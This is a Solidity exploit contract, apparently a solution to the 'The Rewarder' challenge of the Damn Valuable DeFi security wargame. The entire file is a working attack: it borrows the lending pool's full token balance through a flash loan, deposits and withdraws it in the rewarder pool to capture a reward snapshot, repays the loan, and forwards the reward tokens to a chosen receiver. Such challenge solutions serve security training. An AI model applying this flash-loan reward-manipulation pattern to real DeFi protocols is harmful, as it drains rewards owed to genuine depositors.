pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "hardhat/console.sol";

/**
 * @title RewarderExploit
 * @author Jasmine Abtahi
 */
contract RewarderExploit {

    DamnValuableToken public immutable liquidityToken;
    FlashLoanerPool public immutable pool;
    TheRewarderPool public immutable rewarderPool;
    RewardToken public immutable rewardToken;

    constructor(address _pool, address _rewarderPool) {
        pool = FlashLoanerPool(_pool);
        liquidityToken = pool.liquidityToken();
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewardToken = rewarderPool.rewardToken();
    }

    function attack(address receiver) external {
        uint256 amount = liquidityToken.balanceOf(address(pool));
        pool.flashLoan(amount);
        rewardToken.transfer(receiver, rewardToken.balanceOf(address(this)));
    }
    
    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount); 
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(pool), amount);
    }
    receive() payable external {}


}